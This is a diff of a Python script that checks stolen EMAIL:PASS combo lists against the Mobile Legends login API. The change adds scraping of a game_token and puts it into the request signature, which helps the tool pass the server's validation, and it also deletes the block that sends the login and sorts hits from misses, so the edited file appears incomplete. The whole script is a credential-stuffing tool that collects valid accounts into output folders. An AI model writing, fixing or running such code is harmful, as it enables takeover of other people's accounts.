@@ -63,7 +63,36 @@ def load_file(filepath):
 
     return lines
 
+def get_game_token():
+    # First make a request to get the initial page
+    headers = {
+        'Accept': '*/*',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    }
+    
+    try:
+        # Make request to initial page to get game_token
+        response = httpx.get('https://mtacc.mobilelegends.com/v2.1/', headers=headers)
+        
+        # Look for game_token in response
+        match = re.search(r'game_token\s*:\s*["\']([^"\']+)["\']', response.text)
+        if match:
+            return match.group(1)
+        
+        # Fallback to checking localStorage
+        match = re.search(r'localStorage\.setItem\(["\']game_token["\']\s*,\s*["\']([^"\']+)["\']', response.text)
+        if match:
+            return match.group(1)
+            
+    except Exception as e:
+        print(f"{colors.red}[ERROR] Failed to get game_token: {str(e)}{colors.reset}")
+    
+    return ''
+
 def check_account(line, successful_creds, error_creds, success_count, incorrect_password_count, no_account_count, other_count, invalid_format_count):
+    # Get game_token first
+    game_token = get_game_token()
+    
     line = line.strip()
     if not line or not re.match(r"^[^:|]+[:|].+$", line):
         print(f"{colors.yellow}[𝙸𝙽𝚅𝙰𝙻𝙸𝙳] - Invalid format: {line}{colors.reset}")
@@ -77,9 +106,9 @@ def check_account(line, successful_creds, error_creds, success_count, incorrect_
         invalid_format_count[0] += 1
         return
 
-    md5_password = hash_md5(password.strip())
-
-    sign = hash_md5(username.strip() + md5_password)
+    # Generate proper sign with game_token
+    md5_password = hash_md5(password.strip()) 
+    sign = hash_md5(username.strip() + md5_password + game_token)
 
     json_data = {
         'op': 'login',
@@ -87,67 +116,18 @@ def check_account(line, successful_creds, error_creds, success_count, incorrect_
         'params': {
             'account': username.strip(),
             'md5pwd': md5_password,
-            'game_token': '',
+            'game_token': game_token,
             'recaptcha_token': '',
             'country': '',
         },
         'lang': 'en',
     }
 
-    headers = {
-        'Accept': '*/*',
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    }
-
-    print(f"[𝙲𝙷𝙴𝙲𝙺𝙸𝙽𝙶] - 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙲𝙷𝙴𝙲𝙺𝙸𝙽𝙶 𝙵𝙾𝚁: {username.strip()}")
-
-    response = httpx.post('https://accountmtapi.mobilelegends.com/', json=json_data, headers=headers)
-
-    try:
-        res = response.json()
-        print(f"{colors.cyan}[𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴] - {json.dumps(res, indent=4)}{colors.reset}")
-
-        msg = res.get('msg')
-
-        if msg == "ok":
-            openid = res.get('data', {}).get('open_id')
-            if openid:
-                print(f"{colors.green}[𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻] - 𝚅𝙰𝙻𝙸𝙳: {username.strip()}{colors.reset}")
-                print(f"{colors.green}[𝙾𝙿𝙴𝙽 𝙸𝙳] - {openid}{colors.reset}")
-                print("----------------------------------------")
-                success_count[0] += 1
-                successful_creds.append(f"𝙴𝙼𝙰𝙸𝙻: {username.strip()}\n𝙿𝙰𝚂𝚂𝙾𝚁𝙳: {password.strip()}\n----------------------------------------")
-        elif msg == "Error_PasswdError":
-            print(f"{colors.yellow}[𝙵𝙰𝙸𝙻𝙴𝙳] - {username.strip()}{colors.reset}")
-            print(f"{colors.yellow}[𝙵𝙰𝙸𝙻𝙴𝙳] - 𝙸𝙽𝙲𝙾𝚁𝚁𝙴𝙲𝚃 𝙿𝙰𝚂𝚜𝚆𝙾𝚁𝙳{colors.reset}")
-            print("----------------------------------------")
-            incorrect_password_count[0] += 1
-            error_creds.append(f"{username.strip()}:{password.strip()} (Incorrect password)")
-        elif msg == "Error_NoAccount":
-            print(f"{colors.yellow}[𝙵𝙰𝙸𝙻𝙴𝙳] - {username.strip()}{colors.reset}")
-            print(f"{colors.yellow}[𝙵𝙰𝙸𝙻𝙴𝙳] - 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙳𝙾𝙴𝚂 𝙽𝙾𝚃 𝙴𝚇𝙸𝚂𝚃{colors.reset}")
-            print("----------------------------------------")
-            no_account_count[0] += 1
-            error_creds.append(f"{username.strip()}:{password.strip()} (Account not found)")
-        else:
-            print(f"{colors.red}[𝙴𝚁𝚁𝙾𝚁] - {username.strip()}{colors.reset}")
-            print(f"{colors.red}[𝙴𝚁𝚁𝙾𝚁] - 𝚄𝙽𝙺𝙽𝙾𝚆𝙽 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴:{colors.reset}")
-            print(f"{colors.red}[𝙴𝚁𝚁𝙾𝚁] - {msg}{colors.reset}")
-            print("----------------------------------------")
-            other_count[0] += 1
-            error_creds.append(f"{username.strip()}:{password.strip()} (Unknown response)")
-
-    except json.JSONDecodeError:
-        print(f"{colors.red}[𝙴𝚁𝚁𝙾𝚁] - Response error for {username.strip()}{colors.reset}")
-        other_count[0] += 1
-        error_creds.append(f"{username.strip()}:{password.strip()} (Response error)")
-
 def main():
     print_banner()
     print(f'{colors.yellow}[!] We accept EMAIL:PASS format.{colors.reset}')
 
-    directory = '/storage/emulated/0/MLA/MLA TXT/'
+    directory = 'C:/Users/chris/Downloads'
     output_valid = '/storage/emulated/0/MLA/𝚅𝙰𝙻𝙸𝙳/'
     output_errors = '/storage/emulated/0/MLA/𝙴𝚁𝚁𝙾𝚁𝚂/'
 
